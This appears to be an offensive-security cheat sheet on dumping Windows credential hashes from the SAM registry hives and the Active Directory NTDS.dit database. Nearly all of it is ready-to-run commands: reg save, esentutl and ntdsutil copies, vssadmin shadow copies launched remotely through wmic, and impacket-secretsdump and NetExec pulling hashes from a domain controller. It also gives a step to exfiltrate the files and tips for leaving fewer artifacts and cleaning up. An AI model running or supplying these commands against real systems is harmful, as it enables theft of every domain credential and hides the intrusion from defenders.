---
description: SAM registry dump, NTDS.dit via vssadmin, secretsdump
---

# SAM & NTDS.dit Dumping

## SAM via Registry
```cmd
reg save hklm\system system
reg save hklm\sam sam
```
```bash
# Extract hashes on Kali
samdump2 system sam
# Or with secretsdump
secretsdump.py -sam sam -system system LOCAL
```

## SAM via esentutl (LOLBin)
```cmd
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d c:\temp\system
```

## NTDS.dit via vssadmin Shadow Copy
```cmd
# Create shadow copy (run on/against DC)
wmic /node:DC01 /user:admin@domain /password:pass process call create "cmd /c vssadmin create shadow /for=C: 2>&1"

# Copy NTDS.dit and hives from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\temp\
```

## NTDS.dit Extraction
```bash
# Mount and extract
net use j: \\DC01\c$\temp /user:administrator pass
secretsdump.py -ntds ntds.dit -system system -security security LOCAL
```

## secretsdump Remote Mode (Most Common Method)
```bash
# Dumps NTDS.dit remotely — no shadow copy needed, no file transfer
impacket-secretsdump domain/user:pass@DC_IP
impacket-secretsdump -hashes :NTLM_HASH domain/user@DC_IP

# With Kerberos auth
impacket-secretsdump -k -no-pass domain/user@DC_FQDN

# NetExec shorthand
nxc smb DC_IP -u user -p pass --ntds
```

## ntdsutil IFM (Microsoft-Signed LOLBin)
```cmd
# Creates an Install From Media backup containing ntds.dit + SYSTEM hive
ntdsutil "ac i ntds" "ifm" "create full c:\temp\ifm" q q
# Then exfiltrate c:\temp\ifm\Active Directory\ntds.dit and c:\temp\ifm\registry\SYSTEM
```

## Notes
- SAM dump requires local admin; NTDS.dit requires DC admin
- vssadmin/wmic leave artifacts in event logs and service states
- secretsdump remote mode is the preferred method — no artifacts on DC filesystem
- Cleanup: `vssadmin delete shadows /shadow={ID}` after shadow copy methods
